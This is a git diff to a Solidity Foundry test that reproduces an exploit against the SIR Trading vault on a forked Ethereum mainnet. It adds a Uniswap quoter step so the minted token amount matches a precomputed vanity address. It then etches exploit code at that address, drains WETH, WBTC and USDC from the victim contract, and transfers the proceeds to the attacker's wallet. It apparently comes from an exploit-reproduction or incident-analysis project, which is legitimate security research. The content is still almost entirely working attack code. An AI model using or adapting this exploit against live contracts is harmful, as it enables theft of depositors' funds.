@@ -9,6 +9,7 @@ import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
 import {INonfungiblePositionManager} from "../../utils/INonfungiblePositionManager.sol";
 import {IImmutableCreate2Factory} from "../../utils/IImmutableCreate2Factory.sol";
 import {ISwapRouter} from "../../utils/ISwapRouter.sol";
+import {IQuoter} from "../../utils/IQuoter.sol";
 import {Token} from "./Token.sol";
 import {IVault} from "./IVault.sol";
 import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
@@ -35,6 +36,8 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
     IWETH9 internal constant weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
     IERC20 internal constant usdc = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
     IERC20 internal constant wbtc = IERC20(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599);
+    IQuoter internal constant quoter = IQuoter(0xb27308f9F90D607463bb33eA1BeBb41C27CE5AB6);
+    address internal constant addressToFind = 0x00000000001271551295307aCC16bA1e7E0d4281; // The address we want to find
 
     function setUp() external {
         cheat.createSelectFork("mainnet", 22157899);
@@ -68,8 +71,8 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
         positionManager.createAndInitializePoolIfNecessary(
             address(tokenB),
             address(this),
-            100, // Fee tier
-            79228162514264337593543950336
+            100, // Fee tier 0,01%
+            79228162514264337593543950336 // Initial sqrt price (Q64.96 format, corresponds to 1:1 ratio)
         );
 
         // Approve the Uniswap pool to spend the debt token
@@ -122,31 +125,44 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
 
         victim.initialize(vaultParams);
 
+        console.log('===== STEP 4: Quote Exact Output Single =====');
+
+        uint256 targetAmount = uint256(uint160(addressToFind)); // Convert address to uint256
+
+        uint256 amountIn = quoter.quoteExactOutputSingle(
+            address(tokenB), // tokenIn
+            address(this), // tokenOut
+            100, // fee
+            uint144((targetAmount * 12000) / 10000), // amountOut
+            0 // sqrtPriceLimitX96
+        );
+
         // Mint APE tokens
         // Here, tokensToMint is still in the slot 1 of the transient storage of the victim contract
         // safeguarding the uniswapV3SwapCallback function. We need to find an address that has the same value and
         // then call the uniswapV3SwapCallback function directly.
-        console.log('===== STEP 4: Mint APE tokens =====');
-        uint256 amountToDeposit = 139650998347915452795864661928406629; // Original Amount to deposit in the vault
+        console.log('===== STEP 5: Mint APE tokens =====');
+        //uint256 amountToDeposit = 139650998347915452795864661928406629; // Original Amount to deposit in the vault
         //uint256 amountToDeposit = 10 * 10**18; // Amount to deposit in the vault
         uint256 tokensMinted = victim.mint(
             true, // isAPE
             vaultParams,
-            amountToDeposit, // amountToDeposit
+            amountIn, // amountToDeposit
             1
         );
 
-        console.log('===== STEP 5: Deploy Exploit Contract at Farmed Address =====');
+        console.log('===== STEP 6: Deploy Exploit Contract at Farmed Address =====');
         //TODO: Here we should use create2 and deploy a contract with a precalculated address that has the same value as tokensMinted
         // bytes32 salt = 0;
         // bytes bytecode = type(Exploit).creationCode;
         // address vanityAddress = factory.safeCreate2(salt, bytecode);
 
         address vanityAddress = address(uint160(tokensMinted));
+        assertTrue (vanityAddress == addressToFind, "Vanity address does not match");
         bytes memory runtimeCode = vm.getDeployedCode("Exploit.sol");
         cheat.etch(vanityAddress, runtimeCode);
 
-        console.log('===== STEP 6: Call exploit function in Exploit Contract =====');
+        console.log('===== STEP 7: Call exploit function in Exploit Contract =====');
         IExploit exploitContract = IExploit(vanityAddress);
         exploitContract.exploit(address(this));
 
@@ -154,7 +170,7 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
         logBalancesWithLabel('Attacker Contract', address(this));
         logBalancesWithLabel('Victim', address(victim));
 
-        console.log('===== STEP 7: Drain Tokens from Victim Contract directly from Exploit Coordinator =====');
+        console.log('===== STEP 8: Drain Tokens from Victim Contract directly from Exploit Coordinator =====');
         // Now keep draining other tokens from the victim contract
         console.log('===== Drain WBTC from Victim Contract =====');
         IVault.VaultParameters memory vaultParamsWbtc = IVault.VaultParameters({
@@ -210,7 +226,7 @@ contract Exploit_SIRTrading is TestHarness, TokenBalanceTracker, ERC20{
         logBalancesWithLabel('Attacker Contract', address(this));
         logBalancesWithLabel('Victim', address(victim));
 
-        console.log('===== STEP 8: Transfer Funds to Attacker EOA =====');
+        console.log('===== STEP 9: Transfer Funds to Attacker EOA =====');
         // Transfer all funds from the attacker contract to the attacker's EOA
         uint256 usdcBalance = usdc.balanceOf(address(this));
         if (usdcBalance > 0) {
